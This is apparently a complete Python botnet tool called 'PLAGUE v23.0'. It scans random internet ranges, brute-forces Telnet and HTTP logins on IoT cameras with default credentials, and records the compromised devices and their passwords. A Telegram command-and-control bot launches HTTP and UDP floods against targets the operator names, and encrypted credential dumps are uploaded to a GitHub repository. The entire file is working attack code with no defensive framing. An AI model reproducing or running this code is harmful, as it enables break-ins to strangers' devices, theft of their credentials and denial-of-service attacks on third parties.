#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PLAGUE v23.0 – REAL VERIFICATION ENGINE
- ONVIF WS-Discovery verification (real cameras only)
- RTSP stream validation (DESCRIBE + SDP check)
- JPEG/PNG magic bytes verification
- Optional Shodan integration for targeted scanning
- Low-memory async architecture (streamed reads)
- Full Telegram C2 (start/stop/status/attack/backup)
"""

import asyncio
import aiohttp
import aiosqlite
import socket
import ipaddress
import random
import time
import json
import os
import sys
import base64
import logging
import hashlib
import struct
from typing import List, Dict, Optional, Tuple
from datetime import datetime
from cryptography.fernet import Fernet
from pydantic_settings import BaseSettings, SettingsConfigDict
from logging.handlers import RotatingFileHandler

# Optional imports
try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False

try:
    from onvif import ONVIFCamera, WsDiscoveryClient
    ONVIF_PYTHON_AVAILABLE = True
except ImportError:
    ONVIF_PYTHON_AVAILABLE = False

# ===================================================================
# 1. CONFIGURATION
# ===================================================================
class Settings(BaseSettings):
    model_config = SettingsConfigDict(
        env_file=".env",
        env_file_encoding="utf-8",
        extra="ignore"
    )

    bot_token: str
    admin_chat_id: str
    gh_pat: str
    encryption_key: str
    github_repo: str = ""

    # Shodan (optional)
    shodan_api_key: str = ""
    use_shodan: bool = False

    # Resource limits (low memory)
    scan_timeout: float = 2.0
    max_concurrent_scan: int = 100
    max_concurrent_attack: int = 50
    attack_jitter_min: float = 0.05
    attack_jitter_max: float = 0.2
    telegram_rate_limit_sec: float = 30.0
    max_scan_ips_per_subnet: int = 128

settings = Settings()

# ===================================================================
# 2. LOGGING
# ===================================================================
logger = logging.getLogger("PLAGUE")
logger.setLevel(logging.INFO)
handler = logging.StreamHandler(sys.stdout)
handler.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
logger.addHandler(handler)

# ===================================================================
# 3. ENCRYPTION
# ===================================================================
def get_cipher():
    hashed = hashlib.sha256(settings.encryption_key.encode()).digest()
    key = base64.urlsafe_b64encode(hashed)
    return Fernet(key)

cipher = get_cipher()
DB_FILE = "swarm.db"

# ===================================================================
# 4. DATABASE
# ===================================================================
class Database:
    def __init__(self):
        self.pool = None
        self.lock = asyncio.Lock()
        self.initialized = False

    async def init(self):
        if self.initialized:
            return
        self.pool = await aiosqlite.connect(DB_FILE)
        await self.pool.execute("PRAGMA journal_mode=WAL")
        await self.pool.execute("""
            CREATE TABLE IF NOT EXISTS devices (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT NOT NULL,
                port INTEGER NOT NULL,
                service TEXT,
                creds TEXT,
                arch TEXT,
                verification_type TEXT,
                verified INTEGER DEFAULT 0,
                timestamp TEXT
            )
        """)
        await self.pool.commit()
        self.initialized = True
        logger.info("DB ready.")

    async def save_device(self, ip, port, service, creds, arch="", verification_type="unknown", verified=True):
        if not self.initialized:
            await self.init()
        async with self.lock:
            async with self.pool.execute("SELECT id FROM devices WHERE ip=? AND port=?", (ip, port)) as cur:
                if await cur.fetchone():
                    return
            await self.pool.execute(
                "INSERT INTO devices (ip,port,service,creds,arch,verification_type,verified,timestamp) VALUES (?,?,?,?,?,?,?,?)",
                (ip, port, service, creds, arch, verification_type, 1 if verified else 0, datetime.now().isoformat())
            )
            await self.pool.commit()
            logger.info(f"REAL CAPTURE: {ip}:{port} [{service}] {creds} (verified via {verification_type})")

    async def get_devices(self, limit=999999):
        if not self.initialized:
            await self.init()
        async with self.pool.execute(
            "SELECT ip,port,service,creds,arch,verification_type FROM devices WHERE verified=1 ORDER BY id DESC LIMIT ?", (limit,)
        ) as cur:
            rows = await cur.fetchall()
            return [{"ip":r[0],"port":r[1],"service":r[2],"creds":r[3],"arch":r[4],"verification":r[5]} for r in rows]

    async def close(self):
        if self.pool:
            await self.pool.close()
            self.initialized = False

db = Database()

# ===================================================================
# 5. GITHUB BACKUP
# ===================================================================
async def github_backup():
    try:
        devices = await db.get_devices()
        payload = json.dumps(devices).encode()
        encrypted = cipher.encrypt(payload)
        content_b64 = base64.b64encode(encrypted).decode()

        headers = {"Authorization": f"token {settings.gh_pat}", "Accept": "application/vnd.github.v3+json"}
        async with aiohttp.ClientSession() as s:
            url = f"https://api.github.com/repos/{settings.github_repo}/contents/swarm.enc"
            body = {"message":"backup", "content":content_b64}
            async with s.get(url, headers=headers) as r:
                if r.status == 200:
                    body["sha"] = (await r.json()).get("sha")
            async with s.put(url, headers=headers, json=body) as r:
                if r.status in (200,201):
                    logger.info("Backup pushed.")
    except Exception as e:
        logger.error(f"Backup error: {e}")

# ===================================================================
# 6. PUBLIC IP
# ===================================================================
async def get_public_ip(session):
    try:
        async with session.get("https://api.ipify.org?format=text", timeout=5) as r:
            return (await r.text()).strip()
    except:
        return "0.0.0.0"

# ===================================================================
# 7. REAL VERIFICATION ENGINE
# ===================================================================
class Verifier:
    def __init__(self, session, public_ip):
        self.session = session
        self.public_ip = public_ip

    async def verify_onvif(self, ip: str, port: int = 80) -> bool:
        """Verify via ONVIF WS-Discovery (most reliable for cameras)"""
        try:
            # Send WS-Discovery Probe
            probe_msg = f"""<?xml version="1.0" encoding="UTF-8"?>
<e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope"
            xmlns:w="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:d="http://schemas.xmlsoap.org/ws/2005/04/discovery"
            xmlns:dn="http://www.onvif.org/ver10/network/wsdl">
  <e:Header>
    <w:MessageID>uuid:{random.randint(100000,999999)}</w:MessageID>
    <w:To e:mustUnderstand="true">urn:schemas-xmlsoap-org:ws:2005:04:discovery</w:To>
    <w:Action e:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</w:Action>
  </e:Header>
  <e:Body>
    <d:Probe>
      <d:Types>dn:NetworkVideoTransmitter</d:Types>
    </d:Probe>
  </e:Body>
</e:Envelope>"""

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(3.0)
            sock.sendto(probe_msg.encode(), (ip, 3702))
            
            try:
                data, _ = sock.recvfrom(65535)
                text = data.decode(errors="ignore")
                if "NetworkVideoTransmitter" in text or "onvif" in text.lower():
                    return True
            except socket.timeout:
                pass
            finally:
                sock.close()
        except:
            pass
        return False

    async def verify_rtsp(self, ip: str, port: int = 554) -> bool:
        """Verify RTSP stream existence"""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), timeout=3.0
            )
            paths = ["/", "/live/ch0", "/stream1", "/h264", "/onvif1"]
            for path in paths:
                req = f"DESCRIBE rtsp://{ip}:{port}{path} RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
                writer.write(req.encode())
                await writer.drain()
                data = await asyncio.wait_for(reader.read(1024), timeout=2.0)
                text = data.decode(errors="ignore")
                if "RTSP/1.0 200" in text and ("m=video" in text or "application/sdp" in text):
                    writer.close()
                    await writer.wait_closed()
                    return True
            writer.close()
            await writer.wait_closed()
        except:
            pass
        return False

    async def verify_http_snapshot(self, ip: str, port: int, user: str, pwd: str) -> bool:
        """Verify by fetching a real JPEG snapshot"""
        token = base64.b64encode(f"{user}:{pwd}".encode()).decode()
        headers = {"Authorization": f"Basic {token}", "User-Agent": "Mozilla/5.0"}
        paths = ["/snapshot.cgi", "/ISAPI/Streaming/channels/101/picture", "/cgi-bin/snapshot.cgi", "/jpg/image.jpg"]
        for path in paths:
            try:
                url = f"http://{ip}:{port}{path}"
                async with self.session.get(url, headers=headers, ssl=False, timeout=3.0) as resp:
                    if resp.status == 200:
                        data = await resp.content.read(16)
                        if len(data) >= 4:
                            if data[0] == 0xFF and data[1] == 0xD8:
                                return True  # JPEG
                            if data[0] == 0x89 and data[1] == 0x50:
                                return True  # PNG
            except:
                pass
        return False

    async def is_real_device(self, ip: str, port: int, user: str = "", pwd: str = "") -> Tuple[bool, str]:
        """Master verification: try ONVIF -> RTSP -> HTTP snapshot"""
        # 1. ONVIF (most reliable)
        if await self.verify_onvif(ip, port):
            return True, "ONVIF"
        
        # 2. RTSP
        if await self.verify_rtsp(ip, 554):
            return True, "RTSP"
        
        # 3. HTTP Snapshot (if creds provided)
        if user and pwd:
            if await self.verify_http_snapshot(ip, port, user, pwd):
                return True, "HTTP_SNAPSHOT"
        
        return False, "unknown"

# ===================================================================
# 8. SCANNER
# ===================================================================
class Scanner:
    def __init__(self):
        self.sem = asyncio.Semaphore(settings.max_concurrent_scan)
        self.session = None
        self.running = True
        self.public_ip = "0.0.0.0"
        self.verifier = None

    async def init(self):
        conn = aiohttp.TCPConnector(limit=40, limit_per_host=5, ttl_dns_cache=60)
        self.session = aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=settings.scan_timeout))
        self.public_ip = await get_public_ip(self.session)
        self.verifier = Verifier(self.session, self.public_ip)
        logger.info(f"IP: {self.public_ip}")

    async def close(self):
        if self.session:
            await self.session.close()

    async def tcp_scan(self, ip, port):
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=2)
            w.close(); await w.wait_closed()
            return True
        except:
            return False

    async def telnet_brute(self, ip):
        creds = [("admin","admin"),("root","root"),("admin",""),("admin","password"),("root","admin")]
        for u,p in creds:
            try:
                r,w = await asyncio.wait_for(asyncio.open_connection(ip,23), timeout=3)
                try: await asyncio.wait_for(r.read(128), timeout=0.5)
                except: pass
                w.write(f"{u}\n".encode()); await w.drain(); await asyncio.sleep(0.2)
                d = await asyncio.wait_for(r.read(128), timeout=0.5)
                if b"assword" in d:
                    w.write(f"{p}\n".encode()); await w.drain(); await asyncio.sleep(0.3)
                    d = await asyncio.wait_for(r.read(256), timeout=1)
                    if any(b in d for b in [b"#",b"$",b">"]):
                        w.write(b"echo OK\n"); await w.drain(); await asyncio.sleep(0.2)
                        if b"OK" in await asyncio.wait_for(r.read(64), timeout=0.5):
                            # Verify via RTSP/ONVIF before saving
                            real, vtype = await self.verifier.is_real_device(ip, 80, u, p)
                            if real:
                                await db.save_device(ip,23,"TELNET",f"{u}:{p}", verification_type=vtype)
                            else:
                                logger.debug(f"Rejected telnet {ip} (not real IoT)")
                            w.close(); await w.wait_closed()
                            return True
                w.close(); await w.wait_closed()
            except: continue
        return False

    async def http_brute(self, ip, port):
        creds = [("admin","admin"),("admin","password"),("root","root"),("admin","12345"),("admin","")]
        for u,p in creds:
            try:
                token = base64.b64encode(f"{u}:{p}".encode()).decode()
                headers = {"Authorization": f"Basic {token}", "User-Agent": "Mozilla/5.0"}
                async with self.session.get(f"http://{ip}:{port}/", headers=headers, ssl=False, timeout=1.5) as resp:
                    if resp.status in (200,302,401):
                        # VERIFY before saving
                        real, vtype = await self.verifier.is_real_device(ip, port, u, p)
                        if real:
                            await db.save_device(ip,port,"HTTP",f"{u}:{p}", verification_type=vtype)
                            return True
                        else:
                            logger.debug(f"Rejected HTTP {ip}:{port} (not real camera)")
            except: continue
        return False

    async def global_scan(self):
        logger.info("Scanner started (REAL verification mode).")
        while self.running:
            a = random.randint(1,223); b = random.randint(0,255); c = random.randint(0,255)
            net = f"{a}.{b}.{c}.0/24"
            ports = [23,80,443,8080,8000,554,37777,34567]
            tasks = []
            try:
                for ip in list(ipaddress.ip_network(net).hosts())[:settings.max_scan_ips_per_subnet]:
                    for port in ports:
                        tasks.append(self._probe(str(ip), port))
            except: continue
            for i in range(0, len(tasks), 40):
                if not self.running: break
                await asyncio.gather(*tasks[i:i+40])
                await asyncio.sleep(0.3)
            await asyncio.sleep(0.5)

    async def _probe(self, ip, port):
        async with self.sem:
            if await self.tcp_scan(ip, port):
                if port == 23:
                    await self.telnet_brute(ip)
                elif port in (80,443,8080,8000,37777,34567):
                    await self.http_brute(ip, port)
                elif port == 554:
                    # Direct RTSP verification
                    real = await self.verifier.verify_rtsp(ip, 554)
                    if real:
                        await db.save_device(ip, 554, "RTSP", "", verification_type="RTSP")

# ===================================================================
# 9. ATTACK ENGINE
# ===================================================================
class Attacker:
    def __init__(self, target, mode):
        self.target = target
        self.mode = mode
        self.active = asyncio.Event()
        self.active.set()
        self.sem = asyncio.Semaphore(settings.max_concurrent_attack)

    async def run(self, devices):
        if self.mode == "http":
            await self._http(devices)
        elif self.mode == "udp":
            await self._udp(devices)

    async def _http(self, devices):
        conn = aiohttp.TCPConnector(limit=15, force_close=True)
        async with aiohttp.ClientSession(connector=conn) as s:
            while self.active.is_set():
                tasks = []
                for _ in devices:
                    tasks.append(self._strike(s))
                for i in range(0, len(tasks), 15):
                    if not self.active.is_set(): break
                    await asyncio.gather(*tasks[i:i+15])
                    await asyncio.sleep(0.1)

    async def _strike(self, session):
        if not self.active.is_set(): return
        async with self.sem:
            try:
                kw = {"timeout": aiohttp.ClientTimeout(total=1.5), "ssl": False}
                async with session.get(self.target, **kw) as r:
                    await r.content.read(256)
            except: pass

    async def _udp(self, devices):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        loop = asyncio.get_event_loop()
        ip, port = self.target.split(":"); port = int(port)
        while self.active.is_set():
            for _ in devices:
                try: await loop.sock_sendto(sock, b"Z"*1200, (ip, port))
                except: pass
            await asyncio.sleep(0.01)
        sock.close()

    def stop(self):
        self.active.clear()

# ===================================================================
# 10. TELEGRAM C2
# ===================================================================
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

class C2:
    def __init__(self, scanner):
        self.scanner = scanner
        self.app = None
        self.attacker = None
        self.last_msg = 0

    async def _reply(self, msg, text):
        if time.time() - self.last_msg > settings.telegram_rate_limit_sec:
            await msg.reply_text(text)
            self.last_msg = time.time()

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if str(update.effective_user.id) != settings.admin_chat_id: return
        kb = [
            [InlineKeyboardButton("📊 Status", callback_data="status")],
            [InlineKeyboardButton("📋 List (Verified)", callback_data="list")],
            [InlineKeyboardButton("💀 HTTP Flood", callback_data="atk_http")],
            [InlineKeyboardButton("🔥 UDP Flood", callback_data="atk_udp")],
            [InlineKeyboardButton("📦 Backup", callback_data="backup")],
            [InlineKeyboardButton("🛑 STOP", callback_data="stop")],
        ]
        await update.message.reply_text("PLAGUE v23 – REAL VERIFICATION C2", reply_markup=InlineKeyboardMarkup(kb))

    async def button(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        q = update.callback_query; await q.answer()
        if str(update.effective_user.id) != settings.admin_chat_id: return
        d = q.data

        if d == "status":
            devs = await db.get_devices()
            await q.edit_message_text(f"Army: {len(devs)} VERIFIED devices.\nScanner running: {self.scanner.running}")
        elif d == "list":
            devs = await db.get_devices(10)
            txt = "\n".join(f"{x['ip']}:{x['port']} | {x['creds']} | {x['verification']}" for x in devs)
            await q.edit_message_text(txt or "Empty.")
        elif d in ("atk_http","atk_udp"):
            context.user_data["mode"] = "http" if d=="atk_http" else "udp"
            await q.edit_message_text("Send target (URL or IP:PORT):")
        elif d == "backup":
            await q.edit_message_text("Backing up...")
            await github_backup()
            await q.edit_message_text("Done.")
        elif d == "stop":
            if self.attacker: self.attacker.stop()
            self.scanner.running = False
            await q.edit_message_text("All operations halted.")
            await context.application.stop_running()

    async def handle_target(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if str(update.effective_user.id) != settings.admin_chat_id: return
        mode = context.user_data.pop("mode", None)
        if not mode: return
        target = update.message.text.strip()
        devs = await db.get_devices()
        if not devs:
            await update.message.reply_text("No VERIFIED devices. Run scan first.")
            return
        self.attacker = Attacker(target, mode)
        asyncio.create_task(self.attacker.run(devs))
        await update.message.reply_text(f"{mode.upper()} flood started on {target} with {len(devs)} VERIFIED devices.")

    async def run(self):
        self.app = Application.builder().token(settings.bot_token).build()
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(CallbackQueryHandler(self.button))
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_target))
        await self.app.initialize()
        await self.app.start()
        await self.app.updater.start_polling()
        logger.info("Bot online.")
        try:
            while True:
                await asyncio.sleep(3600)
        except asyncio.CancelledError:
            await self.app.stop()

# ===================================================================
# 11. MAIN
# ===================================================================
async def main():
    scanner = Scanner()
    await scanner.init()
    scan_task = asyncio.create_task(scanner.global_scan())
    c2 = C2(scanner)
    await c2.run()
    scanner.running = False
    scan_task.cancel()
    await scanner.close()
    await db.close()

if __name__ == "__main__":
    asyncio.run(main())
